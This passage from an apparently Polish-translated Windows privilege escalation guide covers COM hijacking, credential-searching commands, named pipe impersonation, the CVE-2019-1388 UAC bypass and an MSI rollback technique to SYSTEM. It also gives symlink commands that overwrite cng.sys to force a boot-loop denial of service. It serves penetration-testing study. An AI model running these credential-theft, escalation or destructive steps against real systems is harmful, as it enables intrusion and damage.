Klasy i interfejsy COM są definiowane w rejestrze pod **HKEY\CLASSES\ROOT\CLSID** oraz **HKEY\CLASSES\ROOT\Interface** odpowiednio. Ten obszar rejestru powstaje przez połączenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Wewnątrz wpisów CLSID w tym obszarze rejestru można znaleźć podrzędny klucz **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **DLL** oraz wartość nazwaną **ThreadingModel**, która może być **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) lub **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

W praktyce, jeśli możesz **nadpisać którąś z DLL**, która ma być załadowana, możesz eskalować uprawnienia jeśli ta DLL zostanie uruchomiona przez innego użytkownika.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Ogólne wyszukiwanie haseł w plikach i rejestrze**

**Wyszukiwanie zawartości plików**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Wyszukaj plik o określonej nazwie**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Przeszukaj rejestr w poszukiwaniu nazw kluczy i haseł**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Narzędzia wyszukujące passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin. Stworzyłem ten plugin, aby **automatically execute every metasploit POST module that searches for credentials** w systemie ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie przeszukuje wszystkie pliki zawierające passwords wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) jest kolejnym świetnym narzędziem do wydobywania password z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sessions**, **usernames** i **passwords** w kilku narzędziach, które zapisują te dane w postaci jawnego tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy też nowy proces** (`CreateProcess()`) **o niskich uprawnieniach, ale dziedziczący wszystkie otwarte uchwyty głównego procesu**.\
Jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przejąć **otwarty uchwyt do uprzywilejowanego procesu utworzonego** przez `OpenProcess()` i **wstrzyknąć shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, umożliwiają komunikację między procesami i transfer danych.

Windows udostępnia funkcję nazwaną **Named Pipes**, pozwalającą niepowiązanym procesom na dzielenie się danymi, nawet przez różne sieci. Przypomina to architekturę klient/serwer, z rolami zdefiniowanymi jako **named pipe server** i **named pipe client**.

Gdy dane są wysyłane przez pipe przez **client**, **server** który utworzył pipe ma możliwość **przyjąć tożsamość** **clienta**, o ile posiada wymagane prawa **SeImpersonate**. Zidentyfikowanie **uprzywilejowanego procesu**, który komunikuje się za pomocą pipe, który możesz zasymulować, daje możliwość **uzyskania wyższych uprawnień** poprzez przybranie tożsamości tego procesu, gdy ten wejdzie w interakcję z pipe, które utworzyłeś. Instrukcje do wykonania takiego ataku znajdują się [**here**](named-pipe-client-impersonation.md) oraz [**here**](#from-high-integrity-to-system).

Dodatkowo następujące narzędzie pozwala **przechwycić komunikację named pipe narzędziem typu burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a to narzędzie pozwala wypisać i zobaczyć wszystkie pipes, aby znaleźć privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Sprawdź stronę **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

Po uzyskaniu shel'a jako użytkownik mogą istnieć zadania zaplanowane lub inne procesy, które są uruchamiane i **przekazują poświadczenia w linii poleceń**. Poniższy skrypt zbiera command lines procesów co dwie sekundy i porównuje bieżący stan z poprzednim, wypisując wszelkie różnice.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kradzież haseł z procesów

## Od użytkownika o niskich uprawnieniach do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP) i UAC jest włączony, w niektórych wersjach Microsoft Windows możliwe jest uruchomienie terminala lub dowolnego innego procesu takiego jak "NT\AUTHORITY SYSTEM" z konta nieuprzywilejowanego użytkownika.

To umożliwia eskalację uprawnień i jednoczesne obejście UAC przy użyciu tej samej podatności. Dodatkowo nie ma potrzeby instalowania czegokolwiek, a binary używany w trakcie procesu jest podpisany i wydany przez Microsoft.

Niektóre z dotkniętych systemów to:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Aby wykorzystać tę podatność, należy wykonać następujące kroki:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Przeczytaj to, aby **dowiedzieć się o Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj to, aby dowiedzieć się o UAC i UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Atak polega zasadniczo na nadużyciu funkcji rollback Windows Installer, aby zastąpić legalne pliki złośliwymi podczas procesu odinstalowywania. W tym celu atakujący musi stworzyć **malicious MSI installer**, który zostanie użyty do przejęcia folderu `C:\Config.Msi`, który następnie Windows Installer będzie używać do przechowywania plików rollback podczas odinstalowywania innych pakietów MSI, gdzie pliki rollback zostałyby zmodyfikowane, aby zawierać payload.

Podsumowana technika wygląda następująco:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Utwórz `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w zapisywalnym folderze (`TARGETDIR`).
- Oznacz instalator jako **"UAC Compliant"**, aby **non-admin user** mógł go uruchomić.
- Trzymaj otwarty **handle** do pliku po instalacji.

- Step 2: Begin Uninstall
- Odinstaluj to samo `.msi`.
- Proces odinstalowywania zaczyna przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (rollback backups).
- **Poll the open file handle** używając `GetFinalPathNameByHandle`, aby wykryć kiedy plik staje się `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` zawiera **custom uninstall action (`SyncOnRbfWritten`)**, która:
- Sygnalizuje, gdy `.rbf` został zapisany.
- Następnie **czeka** na inny event zanim dokończy uninstall.

- Step 4: Block Deletion of `.rbf`
- Po sygnale, **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — to **uniemożliwia jego usunięcie**.
- Następnie **odesyłasz sygnał z powrotem**, aby uninstall mógł się dokończyć.
- Windows Installer nie może usunąć `.rbf`, i ponieważ nie może usunąć wszystkich zawartości, **`C:\Config.Msi` nie zostaje usunięty**.

- Step 5: Manually Delete `.rbf`
- Ty (atakujący) ręcznie usuwasz plik `.rbf`.
- Teraz **`C:\Config.Msi` jest pusty**, gotowy do przejęcia.

> W tym momencie **wywołaj vulnerability umożliwiające SYSTEM-level arbitrary folder delete**, aby usunąć `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Odtwórz folder `C:\Config.Msi` samodzielnie.
- Ustaw **słabe DACLs** (np. Everyone:F), i **trzymaj otwarty handle** z `WRITE_DAC`.

- Step 7: Run Another Install
- Zainstaluj `.msi` ponownie, z:
- `TARGETDIR`: lokalizacja zapisywalna.
- `ERROROUT`: zmienna, która wywołuje wymuszoną awarię.
- Ta instalacja będzie użyta do ponownego wywołania **rollback**, który odczytuje `.rbs` i `.rbf`.

- Step 8: Monitor for `.rbs`
- Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi` aż pojawi się nowe `.rbs`.
- Przechwyć jego nazwę pliku.

- Step 9: Sync Before Rollback
- `.msi` zawiera **custom install action (`SyncBeforeRollback`)**, która:
- Sygnalizuje event, gdy `.rbs` zostanie utworzony.
- Następnie **czeka** zanim będzie kontynuować.

- Step 10: Reapply Weak ACL
- Po otrzymaniu eventu `.rbs created`:
- Windows Installer **przywraca silne ACL** do `C:\Config.Msi`.
- Ale ponieważ nadal masz handle z `WRITE_DAC`, możesz **ponownie nałożyć słabe ACLs**.

> ACLs są **egzekwowane tylko przy otwarciu handle**, więc nadal możesz zapisywać do folderu.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Nadpisz plik `.rbs` fałszywym rollback script, który mówi Windows, aby:
- Przywrócić twój plik `.rbf` (złośliwy DLL) do **uprzywilejowanej lokalizacji** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Upuścić fałszywe `.rbf` zawierające **złośliwy DLL z payloadem uruchamianym jako SYSTEM**.

- Step 12: Trigger the Rollback
- Sygnalizuj event synchronizacji, aby instalator wznowił działanie.
- Typ 19 custom action (`ErrorOut`) jest skonfigurowany tak, aby **celowo spowodować awarię instalacji** w znanym miejscu.
- To powoduje rozpoczęcie **rollback**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Odczytuje twój złośliwy `.rbs`.
- Kopiuje twój `.rbf` DLL do docelowej lokalizacji.
- Masz teraz **złośliwy DLL w ścieżce ładowanej przez SYSTEM**.

- Final Step: Execute SYSTEM Code
- Uruchom zaufany **auto-elevated binary** (np. `osk.exe`), które załaduje DLL, który przejąłeś.
- **Boom**: Twój kod jest wykonany **jako SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Główna technika rollback MSI (poprzednia) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co jeśli twoja podatność pozwala jedynie na **arbitrary file deletion**?

Możesz wykorzystać **NTFS internals**: każdy folder ma ukryty alternate data stream zwany:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ten strumień przechowuje **metadane indeksu** folderu.

Dlatego jeśli **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usuwa cały folder** z systemu plików.

Możesz to zrobić, używając standardowych file deletion APIs, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Nawet jeśli wywołujesz *file* delete API, ono **usuwa sam folder**.

### Od Folder Contents Delete do SYSTEM EoP
Co jeśli twój primitive nie pozwala na usuwanie dowolnych plików/folderów, ale **pozwala na usunięcie *zawartości* folderu kontrolowanego przez atakującego**?

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- The oplock **pauses execution** when a privileged process tries to delete `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Krok 3: Wywołaj proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock triggers** i przekazuje kontrolę do twojego callbacka.

4. Krok 4: Wewnątrz oplock callbacka – przekieruj usunięcie

- Opcja A: Przenieś `file1.txt` w inne miejsce
- To opróżnia `folder1` bez przerwania oplock.
- Nie usuwaj `file1.txt` bezpośrednio — to zwolni oplock zbyt wcześnie.

- Opcja B: Zamień `folder1` w **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> To celuje w wewnętrzny strumień NTFS, który przechowuje metadane folderu — jego usunięcie usuwa folder.

5. Krok 5: Zwolnienie oplocka
- Proces SYSTEM kontynuuje i próbuje usunąć `file1.txt`.
- Ale teraz, z powodu junction + symlink, tak naprawdę usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Wynik**: `C:\Config.Msi` zostaje usunięty przez SYSTEM.

### Od Arbitrary Folder Create do Permanent DoS

Wykorzystaj prymityw, który pozwala na **utworzenie dowolnego folderu jako SYSTEM/admin** —  nawet jeśli **nie możesz zapisywać plików** lub **ustawić słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```
- Ta ścieżka zazwyczaj odpowiada sterownikowi trybu jądra `cng.sys`.
- Jeśli **wstępnie utworzysz ją jako katalog**, Windows nie załaduje rzeczywistego sterownika przy rozruchu.
- Następnie Windows próbuje załadować `cng.sys` podczas rozruchu.
- Widząc katalog, **nie jest w stanie rozwiązać rzeczywistego sterownika**, i **powoduje awarię lub zatrzymanie rozruchu**.
- Nie ma **mechanizmu awaryjnego**, ani **odzyskiwania** bez zewnętrznej interwencji (np. naprawy rozruchu lub dostępu do dysku).

### Z uprzywilejowanych ścieżek logów/kopii zapasowych + OM symlinks do dowolnego nadpisania pliku / DoS przy rozruchu

Gdy **uprzywilejowana usługa** zapisuje logi/eksporty do ścieżki odczytywanej z **zapisowalnej konfiguracji**, przekieruj tę ścieżkę za pomocą **Object Manager symlinks + NTFS mount points**, aby zamienić uprzywilejowany zapis w dowolne nadpisanie (nawet **bez** SeCreateSymbolicLinkPrivilege).

**Wymagania**
- Konfiguracja przechowująca docelową ścieżkę jest zapisywalna przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia punktu montowania do `\RPC Control` oraz OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Uprzywilejowana operacja, która zapisuje do tej ścieżki (log, export, report).

**Przykładowy łańcuch**
1. Odczytaj konfigurację, aby ustalić docelową ścieżkę logów uprzywilejowanych, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator wyzwala "send test SMS"). Zapis teraz trafia do `C:\Windows\System32\cng.sys`.
4. Zbadaj nadpisany cel (hex/PE parser), aby potwierdzić uszkodzenie; reboot zmusza Windows do załadowania zmanipulowanej ścieżki sterownika → **boot loop DoS**. To można uogólnić na dowolny chroniony plik, który uprzywilejowana usługa otworzy do zapisu.

> `cng.sys` is normally loaded from `C:\Windows\System32\drivers\cng.sys`, but if a copy exists in `C:\Windows\System32\cng.sys` it can be attempted first, making it a reliable DoS sink for corrupt data.



## **Od High Integrity do System**

### **Nowa usługa**

Jeśli już działasz w procesie o High Integrity, **ścieżka do SYSTEM** może być prosta — wystarczy **utworzyć i uruchomić nową usługę**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Podczas tworzenia service binary upewnij się, że to prawidłowa usługa lub że binary wykonuje niezbędne akcje wystarczająco szybko, ponieważ zostanie zabita po 20s jeśli nie jest prawidłową usługą.

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Możesz** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Jeśli masz te token privileges (prawdopodobnie znajdziesz je w procesie już o High Integrity), będziesz w stanie **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_). **Możesz** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Technika ta jest używana przez meterpreter do eskalacji w `getsystem`. Technika polega na **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.\
**Możesz** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Najlepsze narzędzie do wyszukiwania Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sprawdza błędne konfiguracje i wrażliwe pliki (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sprawdza możliwe błędne konfiguracje i zbiera informacje (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sprawdza błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Ekstrahuje zapisane sesje PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj -Thorough lokalnie.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wydobywa poświadczenia z Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Rozsiewa zebrane hasła po domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to PowerShell ADIDNS/LLMNR/mDNS spoofer i narzędzie man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowa enumeracja Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Szuka znanych privesc podatności (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalna weryfikacja **(Wymaga praw administratora)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Szuka znanych privesc podatności (wymaga skompilowania przy użyciu VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeruje hosta szukając błędnych konfiguracji (bardziej narzędzie do zbierania informacji niż privesc) (wymaga kompilacji) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wydobywa poświadczenia z wielu programów (precompiled exe w github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Sprawdza błędne konfiguracje (wykonywalny precompiled w github). Niezalecane. Nie działa dobrze na Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sprawdza możliwe błędne konfiguracje (exe z pythona). Niezalecane. Nie działa dobrze na Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie stworzone na bazie tego posta (nie wymaga accesschk do poprawnego działania, ale może go użyć).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje output **systeminfo** i rekomenduje działające exploity (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje output **systeminfo** i rekomenduje działające exploity (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt używając odpowiedniej wersji .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby zobaczyć zainstalowaną wersję .NET na hoście ofiary możesz zrobić:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referencje

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
